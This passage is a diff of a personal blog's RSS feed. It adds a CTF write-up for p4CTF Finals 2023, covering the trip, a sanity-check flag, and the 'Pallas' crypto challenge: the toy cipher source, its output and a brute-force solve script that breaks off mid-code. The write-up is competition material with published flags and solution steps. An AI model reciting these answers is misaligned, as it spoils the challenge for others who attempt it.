@@ -1,13 +1,883 @@
 <?xml version="1.0" encoding="utf-8" standalone="yes"?>
 <rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
   <channel>
-    <title>ctf on uwuTeddy</title>
+    <title>ctf on teddyctf</title>
     <link>https://TheSavageTeddy.github.io/tags/ctf/</link>
-    <description>Recent content in ctf on uwuTeddy</description>
+    <description>Recent content in ctf on teddyctf</description>
     <generator>Hugo -- gohugo.io</generator>
     <language>en-us</language>
-    <copyright>uwuTeddy</copyright>
-    <lastBuildDate>Sun, 21 May 2023 00:00:00 +0800</lastBuildDate><atom:link href="https://TheSavageTeddy.github.io/tags/ctf/index.xml" rel="self" type="application/rss+xml" />
+    <copyright>teddyctf</copyright>
+    <lastBuildDate>Thu, 22 Jun 2023 21:20:00 +0800</lastBuildDate><atom:link href="https://TheSavageTeddy.github.io/tags/ctf/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>CTF Writeups - p4CTF Finals 2023 in Poland</title>
+      <link>https://TheSavageTeddy.github.io/posts/p4ctf-finals-2023/</link>
+      <pubDate>Thu, 22 Jun 2023 21:20:00 +0800</pubDate>
+      
+      <guid>https://TheSavageTeddy.github.io/posts/p4ctf-finals-2023/</guid>
+      <description>Overview p4CTF Finals was an onsite event held in June 2023 in Katowice, Poland. Together with Emu Exploit, I qualified for event in the p4CTF qualifiers and had the opportunity to go to Poland to meet and compete with many top teams in the world, including The Flat Network Society, Dragon Sector, justCatTheFish, hxp, 0rganizers, ALLES and FluxFingers.
+Before we could compete in the event, we had to first get to Poland, which proved to be a pain as our travel time was 50 hours - 30 hours across three flights to Paris, and 20 hours on the bus to Katowice.</description>
+      <content>&lt;h1 id=&#34;overview&#34;&gt;Overview&lt;/h1&gt;
+&lt;p&gt;p4CTF Finals was an onsite event held in June 2023 in Katowice, Poland. Together with Emu Exploit, I qualified for event in the p4CTF qualifiers and had the opportunity to go to Poland to meet and compete with many top teams in the world, including &lt;a href=&#34;https://twitter.com/FlatNetworkOrg&#34;&gt;&lt;code&gt;The Flat Network Society&lt;/code&gt;&lt;/a&gt;, &lt;a href=&#34;https://twitter.com/DragonSectorCTF&#34;&gt;&lt;code&gt;Dragon Sector&lt;/code&gt;&lt;/a&gt;, &lt;a href=&#34;https://twitter.com/justCatTheFish&#34;&gt;&lt;code&gt;justCatTheFish&lt;/code&gt;&lt;/a&gt;, &lt;a href=&#34;https://twitter.com/hxpctf&#34;&gt;&lt;code&gt;hxp&lt;/code&gt;&lt;/a&gt;, &lt;a href=&#34;https://twitter.com/0rganizers&#34;&gt;&lt;code&gt;0rganizers&lt;/code&gt;&lt;/a&gt;, &lt;a href=&#34;https://twitter.com/allesctf&#34;&gt;&lt;code&gt;ALLES&lt;/code&gt;&lt;/a&gt; and &lt;a href=&#34;https://twitter.com/fluxfingers&#34;&gt;&lt;code&gt;FluxFingers&lt;/code&gt;&lt;/a&gt;.&lt;/p&gt;
+&lt;p&gt;Before we could compete in the event, we had to first get to Poland, which proved to be a pain as our travel time was 50 hours - 30 hours across three flights to Paris, and 20 hours on the bus to Katowice. However, it was definetely worth the time, as we got to also see some tourist attractions in Paris!&lt;/p&gt;
+
+  &lt;img src=&#34;./img/emu_paris.png&#34;  class=&#34;center&#34;  style=&#34;border-radius: 5px; max-height: 40em&#34;  /&gt;
+
+
+&lt;p&gt;Also, thanks to the &lt;a href=&#34;https://twitter.com/p4_team&#34;&gt;p4CTF team&lt;/a&gt; for hosting an amazing event, and our sponsors who made the trip possible!&lt;/p&gt;
+&lt;p&gt;Below are writeups for some challenges I solved during the 24h CTF, which were quite unique!&lt;/p&gt;
+&lt;p&gt;For example, for sanity check, you had to go to the p4 organiser&amp;rsquo;s desk and eat (edible) bugs in order to obtain the paper containing network credentials for some of the challenges, and the flag was &lt;code&gt;p4{eat-bugs-gain-sanity}&lt;/code&gt; which I thought was quite funny. The bugs were crunchy.&lt;/p&gt;
+&lt;h1 id=&#34;challenge-overview&#34;&gt;Challenge Overview&lt;/h1&gt;
+&lt;p&gt;There were a total of 18 challenges - I mostly solved crypto, and got a funny unintended solution on a misc. Below are writeups of some of these challenges:&lt;/p&gt;
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;&lt;strong&gt;Challenge&lt;/strong&gt;&lt;/th&gt;
+&lt;th&gt;&lt;strong&gt;Category&lt;/strong&gt;&lt;/th&gt;
+&lt;th&gt;&lt;strong&gt;Solves&lt;/strong&gt;&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;a href=&#34;#pallas-crypto---12-solves&#34;&gt;Pallas&lt;/a&gt;&lt;/td&gt;
+&lt;td&gt;crypto&lt;/td&gt;
+&lt;td&gt;12&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;a href=&#34;#aes_observed-crypto---6-solves&#34;&gt;aes_observed&lt;/a&gt;&lt;/td&gt;
+&lt;td&gt;crypto&lt;/td&gt;
+&lt;td&gt;6&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;a href=&#34;#pepega-packets-misc---5-solves&#34;&gt;Pepega Packets&lt;/a&gt;&lt;/td&gt;
+&lt;td&gt;misc&lt;/td&gt;
+&lt;td&gt;5&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;p&gt;Enjoy!&lt;/p&gt;
+&lt;h1 id=&#34;pallas-crypto---12-solves&#34;&gt;Pallas (crypto) - 12 solves&lt;/h1&gt;
+&lt;blockquote&gt;
+&lt;p&gt;Tell me my secret&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;We are given python source &lt;code&gt;task.py&lt;/code&gt; and the output &lt;code&gt;output.txt&lt;/code&gt;.&lt;/p&gt;
+
+
+
+  &lt;div class=&#34;collapsable-code&#34;&gt;
+    &lt;input id=&#34;2&#34; type=&#34;checkbox&#34;  /&gt;
+    &lt;label for=&#34;2&#34;&gt;
+      &lt;span class=&#34;collapsable-code__language&#34;&gt;python&lt;/span&gt;
+      &lt;span class=&#34;collapsable-code__title&#34;&gt;task.py&lt;/span&gt;
+      &lt;span class=&#34;collapsable-code__toggle&#34; data-label-expand=&#34;Show&#34; data-label-collapse=&#34;Hide&#34;&gt;&lt;/span&gt;
+    &lt;/label&gt;
+    &lt;pre class=&#34;language-python&#34; &gt;&lt;code&gt;
+from pwn import *
+
+from sec import secret
+print(len(secret))
+
+text   = b&amp;#34;The Pallas&amp;#39;s cat is a highly specialised predator of small mammals, which it catches by stalking or ambushing near exits of burrows.&amp;#34;
+
+def bits_to_bytes(l):
+	l = [str(f) for f in l]
+	l=&amp;#34;&amp;#34;.join(l)
+	final = [l[i * 8:(i &amp;#43; 1) * 8] for i in range((len(l) &amp;#43; 8 - 1) // 8 )]
+	final = [int(x,2) for x in final]
+	return bytes(final)
+
+def bytes_to_bits(bb):
+	r = &amp;#34;&amp;#34;
+	for c in bb:
+		r &amp;#43;= bin(c)[2:].rjust(8,&amp;#34;0&amp;#34;)
+	r= list(map(int, r))
+	return r
+
+def my_crypto_inner(text, secret):
+	tl = len(text)
+	sl = len(secret)
+	enc = [0]*len(text)
+	for i in range(tl):
+		enc[i]=text[i]
+		enc[i]^=secret[i % sl]
+		for div in range(1, tl):
+			if i%div == 0:
+				enc[i] ^= enc[(i-div) % sl]
+			if i&amp;gt;0 and div%i == 0:
+				enc[i] ^= text[(i-div) % sl]
+	return enc
+
+def my_crypto(text, secret):
+	text = bytes_to_bits(text)
+	secret = bytes_to_bits(secret)
+	res = my_crypto_inner(text,secret)
+	return bits_to_bytes(res)
+
+encrypted = my_crypto(text,secret)
+print(encrypted)
+
+&lt;/code&gt;&lt;/pre&gt;
+  &lt;/div&gt;
+
+
+&lt;p&gt;&lt;code&gt;output.txt&lt;/code&gt;:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-py&#34; data-lang=&#34;py&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;62&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;_&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\xce\x80&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;^&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x86\x8b\xbe\x00\x15&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;I&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\xa7&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;]&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x86&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;M&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x1f\xe8\x87\x8e\xa3\xec&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;_&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x8d\x8a\xbd\xd4\xe7\x92&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;3&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\xa1\x8c&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;w&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x15&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;F&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x06\x8a\xa8&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;7&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\xa6\xcd&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;)/&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\xaf\xce\xbc\x90&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;go&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\xc4\r&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\xac\xb1&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;ng&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\xd5\x88\\\x07\xa9&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;z&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\\&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;G&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x8d\xc2\x9f\x9c\x89\xf8&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;r&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x87&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;Ut&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\xf5\xdc\xdd&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;a9&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\xe0\xc5\xa0&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;G&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\xb8\xf6\xbe\n\xb1\xd0\xdc&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\xd6\xfc\x15\x13\xbf&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\xbf&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;5&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\xb0&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;S&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x94\x0e\x98\x9a\x12\xd0\x9e\xdf\xba&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;3&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\xd8\x8b\x0e&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;R&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x87&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;$&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\xb3\xd6\xcd\xef\x92\xa1\xa3&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;|&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\xb4&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n\xdb&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;w&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x86&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{DE&amp;#39;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;The main encryption function is &lt;code&gt;my_crypto_inner(text, secret)&lt;/code&gt;, which takes in 2 arguments - the text and the secret. We are given the text, and our goal is to recover the secret which is the flag.&lt;/p&gt;
+&lt;p&gt;Upon some testing, I noticed that the encryption of each byte seemed to be independent of other bytes - that is, there was no shuffling around within the encryption.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-py&#34; data-lang=&#34;py&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;ciphertext &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;_&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\xce\x80&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;^&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x86\x8b\xbe\x00\x15&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;I&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\xa7&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;]&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x86&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;M&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x1f\xe8\x87\x8e\xa3\xec&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;_&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x8d\x8a\xbd\xd4\xe7\x92&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;3&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\xa1\x8c&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;w&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x15&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;F&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x06\x8a\xa8&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;7&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\xa6\xcd&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;)/&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\xaf\xce\xbc\x90&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;go&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\xc4\r&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\xac\xb1&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;ng&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\xd5\x88\\\x07\xa9&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;z&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\\&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;G&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x8d\xc2\x9f\x9c\x89\xf8&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;r&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x87&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;Ut&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\xf5\xdc\xdd&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;a9&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\xe0\xc5\xa0&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;G&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\xb8\xf6\xbe\n\xb1\xd0\xdc&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\xd6\xfc\x15\x13\xbf&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\xbf&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;5&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\xb0&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;S&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x94\x0e\x98\x9a\x12\xd0\x9e\xdf\xba&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;3&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\xd8\x8b\x0e&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;R&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x87&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;$&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\xb3\xd6\xcd\xef\x92\xa1\xa3&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;|&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\xb4&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n\xdb&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;w&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x86&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{DE&amp;#39;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;flag &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;p4{&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;# flag format&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;flag &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; flag&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;ljust(&lt;span style=&#34;color:#ae81ff&#34;&gt;62&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;?&amp;#34;&lt;/span&gt;)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;ind &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;encrypted &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; my_crypto(text,flag)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;print(encrypted[:&lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;])
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;print(ciphertext[:&lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;])
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Running the script above gave the output&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-py&#34; data-lang=&#34;py&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;_&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\xce\x80\x06&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;$&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\xfc\r\xae\xd6&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;W&amp;#39;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;_&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\xce\x80&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;^&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x86\x8b\xbe\x00\x15&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;I&amp;#39;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Notice how the first 3 bytes &lt;code&gt;_\xce\x80&lt;/code&gt; are the same, as we entered the first 3 bytes correct (&lt;code&gt;p4{&lt;/code&gt; flag format)! This means we can recover the flag with a brute force approach, by appending a character to the end and checking if the encrypted matches the ciphertext at that index.&lt;/p&gt;
+&lt;p&gt;For example, we can try encrypting &lt;code&gt;p4{a&lt;/code&gt;, &lt;code&gt;p4{b&lt;/code&gt; etc, and if the output at that index &lt;code&gt;3&lt;/code&gt; matched the given ciphertext at the same index, it would be the correct letter!&lt;/p&gt;
+&lt;p&gt;We can automate this:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-py&#34; data-lang=&#34;py&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; string
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;cs &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; string&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;ascii_letters &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; string&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;digits &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;_!@#$%^&amp;amp;*(),./&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;cs &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; cs&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;encode()
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;ciphertext &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;_&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\xce\x80&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;^&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x86\x8b\xbe\x00\x15&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;I&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\xa7&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;]&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x86&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;M&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x1f\xe8\x87\x8e\xa3\xec&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;_&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x8d\x8a\xbd\xd4\xe7\x92&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;3&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\xa1\x8c&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;w&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x15&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;F&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x06\x8a\xa8&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;7&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\xa6\xcd&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;)/&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\xaf\xce\xbc\x90&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;go&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\xc4\r&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\xac\xb1&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;ng&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\xd5\x88\\\x07\xa9&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;z&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\\&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;G&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x8d\xc2\x9f\x9c\x89\xf8&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;r&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x87&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;Ut&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\xf5\xdc\xdd&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;a9&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\xe0\xc5\xa0&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;G&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\xb8\xf6\xbe\n\xb1\xd0\xdc&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;-&lt;/span&gt;&lt;span 